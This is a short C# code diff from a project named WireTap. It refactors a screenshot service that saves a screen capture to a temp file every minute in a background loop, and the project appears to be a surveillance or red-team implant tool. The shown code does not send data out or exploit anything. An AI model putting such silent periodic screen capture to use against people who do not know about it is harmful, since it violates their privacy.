@@ -1,6 +1,5 @@
 ﻿namespace WireTap.HostedService
 {
-    using global::WireTap.Adapter;
     using Microsoft.Extensions.Hosting;
     using System;
     using System.Threading;
@@ -12,15 +11,13 @@
         {
             Console.WriteLine("ScreenshotService : StartScreenshotServiceAsync");
 
-            var adapter = new ScreenshotAdapter();
-
             while (!cancellationToken.IsCancellationRequested)
             {
                 try
                 {
                     Console.WriteLine("ScreenshotService : Inside captureScreenshot");
                     var filename = Helpers.CreateTempFileName(".jpeg", "screenshot-", "screenshot");
-                    adapter.Execute(filename);
+                    Display.CaptureImage(filename);
                     Console.WriteLine("ScreenshotService : [+] Screenshot captured at: {0}", filename);
                     await Task.Delay(TimeSpan.FromMinutes(1));
                 }
